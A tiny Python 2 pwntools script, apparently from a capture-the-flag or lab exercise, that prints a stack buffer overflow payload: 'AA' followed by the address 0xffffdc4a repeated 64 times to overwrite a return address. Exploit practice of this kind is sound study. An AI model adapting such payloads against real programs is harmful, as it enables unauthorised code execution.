from pwn import *

a = p32(0xffffdc4a) * 64
print 'AA' + a
